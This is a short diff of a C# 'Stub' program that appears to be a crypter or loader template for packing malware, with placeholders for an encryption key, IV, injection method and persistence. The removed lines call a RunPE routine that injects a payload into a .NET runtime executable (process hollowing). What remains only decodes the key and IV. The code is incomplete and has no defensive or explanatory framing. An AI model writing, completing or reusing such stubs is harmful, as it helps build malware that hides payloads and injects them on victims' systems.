@@ -1,35 +1,22 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
-using System.Threading.Tasks;
-using System.Windows.Forms;
 
 namespace Stub
 {
     internal static class Program
     {
+        
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
         [STAThread]
         static void Main()
         {
-            byte[] Key = Convert.FromBase64String("%KEY%");
-            byte[] IV = Convert.FromBase64String("%IV%");
-            string InjectMethod = "%INJECT%";
-
-            byte[] payload = new byte[] { };
-            RunPE.RunPE.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), InjectMethod), payload);
-
-            string persistence = "%PERSISTENCE%";
-            if ("1" == "1")
-            {
-                Console.WriteLine("Running persistence!");
-            }
+            byte[] key = Convert.FromBase64String("%KEY%");
+            byte[] iv = Convert.FromBase64String("%IV%");
         }
     }
 }
